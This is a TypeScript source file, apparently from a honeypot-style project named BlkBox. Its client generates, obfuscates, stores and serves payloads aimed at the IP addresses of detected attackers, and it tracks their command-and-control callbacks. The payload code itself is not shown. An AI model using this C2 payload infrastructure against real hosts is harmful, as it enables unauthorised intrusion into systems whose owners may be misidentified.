/**
 * Cookiejar Client
 *
 * High-level client API for generating and managing payloads.
 * This provides a simple interface for other BlkBox components to create
 * and deploy payloads in response to attacks.
 */

import type { BlkBoxFFI } from "../../lib_deno/lib.ts";
import type { AttackEvent, PayloadType } from "../../lib_deno/types.ts";
import { DoughService, type DoughConfig } from "./dough/mod.ts";
import { bakePayload } from "./bake/mod.ts";
import { JarService, type StoredPayload, type PayloadStatistics } from "./jar/mod.ts";

/**
 * Cookiejar Client Configuration
 */
export interface CookiejarConfig {
  /** C2 callback base URL */
  c2BaseUrl?: string;

  /** Default payload expiration in hours */
  defaultExpirationHours?: number;

  /** Default max callbacks per payload */
  defaultMaxCallbacks?: number;

  /** Global obfuscation level override */
  globalObfuscationLevel?: "none" | "light" | "medium" | "heavy";
}

/**
 * Result of payload generation
 */
export interface PayloadResult {
  /** Unique payload ID */
  payloadId: string;

  /** URL where payload can be retrieved */
  payloadUrl: string;

  /** Type of payload generated */
  payloadType: string;

  /** Target IP address */
  targetIp: string;

  /** Delivery method used */
  deliveryMethod: string;

  /** Expiration timestamp */
  expiresAt: string;

  /** Full configuration used */
  config: DoughConfig;
}

/**
 * Cookiejar Client - Main API for payload generation
 */
export class CookiejarClient {
  private doughService: DoughService;
  private jarService: JarService;
  private config: CookiejarConfig;

  constructor(ffi: BlkBoxFFI, config?: CookiejarConfig) {
    this.config = config || {};

    this.doughService = new DoughService({
      c2BaseUrl: this.config.c2BaseUrl,
      defaultExpirationHours: this.config.defaultExpirationHours,
      defaultMaxCallbacks: this.config.defaultMaxCallbacks
    });

    this.jarService = new JarService(ffi);
  }

  /**
   * Generate and deploy a payload in response to an attack event
   *
   * This is the main entry point for payload generation. It:
   * 1. Creates payload configuration from attack event (Dough)
   * 2. Selects appropriate template (Oven)
   * 3. Bakes the payload with obfuscation (Bake)
   * 4. Stores in database and returns serving URL (Jar)
   */
  async generatePayload(
    event: AttackEvent,
    payloadType: PayloadType
  ): Promise<PayloadResult> {
    // Step 1: Create configuration (Dough)
    const doughConfig = this.doughService.fromAttackEvent(event, payloadType);

    // Apply global obfuscation override if set
    if (this.config.globalObfuscationLevel) {
      doughConfig.obfuscationLevel = this.config.globalObfuscationLevel;
    }

    // Validate configuration
    const validation = this.doughService.validateConfig(doughConfig);
    if (!validation.valid) {
      throw new Error(`Invalid payload configuration: ${validation.errors.join(", ")}`);
    }

    // Step 2 & 3: Bake the payload (Oven + Bake)
    const bakedCode = bakePayload(doughConfig);

    // Step 4: Store in Jar
    await this.jarService.storePayload(doughConfig, bakedCode);

    // Generate payload URL
    const payloadUrl = `${doughConfig.c2Config.callbackUrl}/p/${doughConfig.c2Config.payloadId}`;

    return {
      payloadId: doughConfig.c2Config.payloadId,
      payloadUrl,
      payloadType: doughConfig.payloadType.toString(),
      targetIp: doughConfig.delivery.context.attackerIp,
      deliveryMethod: doughConfig.delivery.method,
      expiresAt: new Date(
        Date.now() + doughConfig.c2Config.expirationHours * 60 * 60 * 1000
      ).toISOString(),
      config: doughConfig
    };
  }

  /**
   * Generate a payload from a custom configuration
   * (for manual/advanced usage)
   */
  async generateFromConfig(config: DoughConfig): Promise<PayloadResult> {
    // Validate configuration
    const validation = this.doughService.validateConfig(config);
    if (!validation.valid) {
      throw new Error(`Invalid payload configuration: ${validation.errors.join(", ")}`);
    }

    // Bake the payload
    const bakedCode = bakePayload(config);

    // Store in Jar
    await this.jarService.storePayload(config, bakedCode);

    // Generate payload URL
    const payloadUrl = `${config.c2Config.callbackUrl}/p/${config.c2Config.payloadId}`;

    return {
      payloadId: config.c2Config.payloadId,
      payloadUrl,
      payloadType: config.payloadType.toString(),
      targetIp: config.delivery.context.attackerIp,
      deliveryMethod: config.delivery.method,
      expiresAt: new Date(
        Date.now() + config.c2Config.expirationHours * 60 * 60 * 1000
      ).toISOString(),
      config
    };
  }

  /**
   * Retrieve a payload by ID
   */
  async getPayload(payloadId: string): Promise<StoredPayload | null> {
    return await this.jarService.getPayload(payloadId);
  }

  /**
   * Serve a payload (mark as delivered and return code)
   */
  async servePayload(payloadId: string): Promise<string | null> {
    return await this.jarService.servePayload(payloadId);
  }

  /**
   * Record a C2 callback from a payload
   */
  async recordCallback(payloadId: string, callbackData: unknown): Promise<void> {
    await this.jarService.recordCallback(payloadId, callbackData);
  }

  /**
   * Terminate a payload (prevent further callbacks)
   */
  async terminatePayload(payloadId: string): Promise<void> {
    await this.jarService.terminatePayload(payloadId);
  }

  /**
   * Get all payloads for a specific target IP
   */
  async getPayloadsByTarget(targetIp: string): Promise<StoredPayload[]> {
    return await this.jarService.getPayloadsByTarget(targetIp);
  }

  /**
   * Get all active payloads
   */
  async getActivePayloads(): Promise<StoredPayload[]> {
    return await this.jarService.getActivePayloads();
  }

  /**
   * Get payload statistics
   */
  async getStatistics(): Promise<PayloadStatistics> {
    return await this.jarService.getStatistics();
  }

  /**
   * Cleanup expired payloads
   */
  async cleanupExpired(): Promise<number> {
    return await this.jarService.cleanupExpired();
  }

  /**
   * Batch generate multiple payloads for an attack
   * (useful for deploying multiple reconnaissance payloads)
   */
  async generateBatch(
    event: AttackEvent,
    payloadTypes: PayloadType[]
  ): Promise<PayloadResult[]> {
    const results: PayloadResult[] = [];

    for (const payloadType of payloadTypes) {
      try {
        const result = await this.generatePayload(event, payloadType);
        results.push(result);
      } catch (error) {
        console.error(`[Cookiejar] Failed to generate ${payloadType}:`, error);
        // Continue with other payloads
      }
    }

    return results;
  }
}

/**
 * Quick payload generation helper
 */
export async function quickPayload(
  ffi: BlkBoxFFI,
  event: AttackEvent,
  payloadType: PayloadType,
  config?: CookiejarConfig
): Promise<PayloadResult> {
  const client = new CookiejarClient(ffi, config);
  return await client.generatePayload(event, payloadType);
}
